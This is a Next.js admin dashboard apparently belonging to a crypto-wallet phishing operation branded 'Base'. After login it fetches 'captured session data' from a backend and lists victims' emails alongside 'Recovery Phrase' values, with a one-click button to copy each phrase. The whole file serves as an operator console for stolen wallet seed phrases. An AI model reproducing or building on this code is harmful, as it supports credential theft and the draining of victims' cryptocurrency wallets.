import { useState, useEffect } from "react";
import Head from "next/head";
import Link from "next/link";

export default function AdminPage() {
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [users, setUsers] = useState<any[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [status, setStatus] = useState("");

  useEffect(() => {
    const token = localStorage.getItem("adminToken");
    if (token) {
      setIsLoggedIn(true);
      fetchUsers(token);
    }
  }, []);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError("");

    try {
      const response = await fetch("http://localhost:5000/api/admin/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      });

      const data = await response.json();

      if (response.ok) {
        localStorage.setItem("adminToken", data.token);
        setIsLoggedIn(true);
        fetchUsers(data.token);
      } else {
        setError(data.message || "Login failed");
      }
    } catch (err) {
      setError("Connection error. Is the backend running?");
    } finally {
      setLoading(false);
    }
  };

  const fetchUsers = async (token: string) => {
    setLoading(true);
    try {
      const response = await fetch("http://localhost:5000/api/admin/users", {
        headers: { Authorization: `Bearer ${token}` },
      });
      const data = await response.json();
      if (response.ok) {
        setUsers(data.users || []);
      } else if (response.status === 401) {
        handleLogout();
      }
    } catch (err) {
      setError("Failed to fetch users");
    } finally {
      setLoading(false);
    }
  };

  const handleLogout = () => {
    localStorage.removeItem("adminToken");
    setIsLoggedIn(false);
    setUsers([]);
  };

  if (!isLoggedIn) {
    return (
      <div className="min-h-screen bg-[#050508] text-white flex flex-col items-center justify-center p-6 font-sans">
        <Head>
          <title>Admin Login | Base Control</title>
        </Head>

        {/* Catchy dynamic background elements */}
        <div className="fixed inset-0 overflow-hidden pointer-events-none">
          <div className="absolute top-[-10%] right-[-10%] w-[500px] h-[500px] bg-[#4285f4]/10 rounded-full blur-[120px]" />
          <div className="absolute bottom-[-10%] left-[-10%] w-[400px] h-[400px] bg-[#9333ea]/10 rounded-full blur-[100px]" />
        </div>

        <div className="relative z-10 w-full max-w-md">
          <div className="text-center mb-10">
            <div className="inline-block p-3 rounded-2xl bg-[#4285f4]/10 border border-[#4285f4]/20 mb-6 group transition-all hover:scale-110">
              <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#4285f4" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
                <path d="M7 11V7a5 5 0 0110 0v4"/>
              </svg>
            </div>
            <h1 className="text-4xl font-bold tracking-tight mb-2 italic">Base Admin</h1>
            <p className="text-white/50 text-sm uppercase tracking-[0.2em]">Restricted Access Area</p>
          </div>

          <form onSubmit={handleLogin} className="bg-[#0f0f14]/80 backdrop-blur-xl border border-white/10 rounded-[32px] p-8 shadow-2xl space-y-6">
            <div className="space-y-2">
              <label className="text-sm font-medium text-white/70 ml-1">Admin Email</label>
              <input
                type="email"
                name="admin_intelligence_email"
                id="admin_intelligence_email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                autoComplete="off"
                className="w-full bg-white/5 border border-white/10 focus:border-[#4285f4] focus:ring-4 focus:ring-[#4285f4]/20 rounded-2xl px-5 py-4 outline-none transition-all placeholder:text-white/20"
                placeholder="admin@base.com"
                required
              />
            </div>

            <div className="space-y-2">
              <label className="text-sm font-medium text-white/70 ml-1">Access Key</label>
              <input
                type="password"
                name="admin_intelligence_pass"
                id="admin_intelligence_pass"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                autoComplete="off"
                className="w-full bg-white/5 border border-white/10 focus:border-[#4285f4] focus:ring-4 focus:ring-[#4285f4]/20 rounded-2xl px-5 py-4 outline-none transition-all placeholder:text-white/20"
                placeholder="••••••••"
                required
              />
            </div>

            {error && (
              <div className="p-4 bg-red-500/10 border border-red-500/30 rounded-2xl text-red-400 text-sm text-center animate-shake">
                {error}
              </div>
            )}

            <button
              type="submit"
              disabled={loading}
              className="w-full py-4 bg-[#4285f4] hover:bg-[#5a9eff] active:scale-[0.98] disabled:opacity-50 disabled:cursor-not-allowed rounded-2xl font-bold text-lg transition-all shadow-lg shadow-[#4285f4]/20"
            >
              {loading ? "Authenticating..." : "Enter Terminal"}
            </button>
          </form>

          <p className="text-center mt-8 text-white/30 text-xs tracking-widest uppercase">
            &copy; 2026 Base Management Protocol
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#050508] text-white flex flex-col font-sans">
      <Head>
        <title>Dashboard | Base Control</title>
      </Head>

      {/* Header */}
      <nav className="sticky top-0 z-50 bg-[#050508]/80 backdrop-blur-md border-b border-white/10 px-6 py-4 flex justify-between items-center">
        <div className="flex items-center gap-4">
          <div className="w-10 h-10 bg-[#4285f4] rounded-xl flex items-center justify-center font-bold text-xl shadow-lg shadow-[#4285f4]/20">
            B
          </div>
          <div>
            <h2 className="text-lg font-bold tracking-tight">Terminal Console</h2>
            <div className="flex items-center gap-2">
              <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse" />
              <span className="text-[10px] text-green-500 uppercase tracking-widest font-bold">System Online</span>
            </div>
          </div>
        </div>

        <button
          onClick={handleLogout}
          className="px-5 py-2.5 bg-white/5 hover:bg-white/10 border border-white/10 rounded-xl text-sm font-semibold transition-all active:scale-95"
        >
          Logout
        </button>
      </nav>

      <main className="flex-1 p-6 lg:p-10 max-w-7xl mx-auto w-full">
        <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-6 mb-10">
          <div>
            <h1 className="text-3xl font-bold mb-2">User Intelligence</h1>
            <p className="text-white/50">Monitoring and managing captured session data.</p>
          </div>

          <div className="flex gap-4 w-full md:w-auto">
             <div className="flex-1 md:flex-none p-4 bg-[#0f0f14] border border-white/5 rounded-2xl">
                <p className="text-white/40 text-[10px] uppercase tracking-widest mb-1">Total Signals</p>
                <p className="text-2xl font-mono font-bold text-[#4285f4]">{users.length}</p>
             </div>
             <button
                onClick={() => fetchUsers(localStorage.getItem("adminToken") || "")}
                className="p-4 bg-[#4285f4]/10 border border-[#4285f4]/20 rounded-2xl hover:bg-[#4285f4]/20 transition-all"
                title="Refresh Logic"
             >
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#4285f4" strokeWidth="2">
                  <path d="M23 4v6h-6M1 20v-6h6"/>
                  <path d="M3.51 9a9 9 0 0114.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0020.49 15"/>
                </svg>
             </button>
          </div>
        </div>

        {/* User Table Card */}
        <div className="bg-[#0f0f14] border border-white/10 rounded-[32px] overflow-hidden shadow-2xl">
          <div className="overflow-x-auto">
            <table className="w-full text-left border-collapse">
              <thead>
                <tr className="bg-white/5 border-b border-white/10">
                  <th className="px-8 py-5 text-sm font-semibold uppercase tracking-widest text-white/40">Timestamp</th>
                  <th className="px-8 py-5 text-sm font-semibold uppercase tracking-widest text-white/40">Email Protocol</th>
                  <th className="px-8 py-5 text-sm font-semibold uppercase tracking-widest text-white/40">Recovery Phrase</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-white/5">
                {users.length > 0 ? (
                  users.map((user, idx) => (
                    <tr key={user._id || idx} className="hover:bg-white/[0.02] transition-colors group">
                      <td className="px-8 py-6 text-sm text-white/60 font-mono">
                        {new Date(user.createdAt).toLocaleString()}
                      </td>
                      <td className="px-8 py-6">
                        <span className="bg-[#4285f4]/10 text-[#4285f4] border border-[#4285f4]/20 px-3 py-1 rounded-lg text-sm font-medium">
                          {user.email}
                        </span>
                      </td>
                      <td className="px-8 py-6">
                        <div className="relative group/seed">
                          <p className="text-sm font-mono text-white/80 leading-relaxed bg-black/30 p-4 rounded-xl border border-white/5 group-hover:border-[#4285f4]/40 transition-all">
                            {user.password}
                          </p>
                          <button
                             onClick={() => {
                               navigator.clipboard.writeText(user.password);
                               setStatus("Signal copied to clipboard!");
                               setTimeout(() => setStatus(""), 2000);
                             }}
                             className="absolute top-2 right-2 opacity-0 group-hover/seed:opacity-100 p-2 bg-white/10 hover:bg-white/20 rounded-lg transition-all"
                             title="Copy Signal"
                          >
                             <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                               <path d="M16 4h2a2 2 0 012 2v14a2 2 0 01-2 2H6a2 2 0 01-2-2V6a2 2 0 012-2h2"/>
                               <rect x="8" y="2" width="8" height="4" rx="1" ry="1"/>
                             </svg>
                          </button>
                        </div>
                      </td>
                    </tr>
                  ))
                ) : (
                  <tr>
                    <td colSpan={3} className="px-8 py-20 text-center text-white/30 italic">
                      No signals detected on the frequency.
                    </td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>
        </div>

        {/* Footer Status */}
        <div className="mt-8 flex justify-center">
           {status && (
             <div className="bg-[#4285f4] text-white px-6 py-2 rounded-full text-sm font-bold shadow-xl animate-bounce">
                {status}
             </div>
           )}
        </div>
      </main>

      <style jsx global>{`
        @keyframes shake {
          0%, 100% { transform: translateX(0); }
          25% { transform: translateX(-5px); }
          75% { transform: translateX(5px); }
        }
        .animate-shake {
          animation: shake 0.2s ease-in-out 0s 2;
        }
      `}</style>
    </div>
  );
}
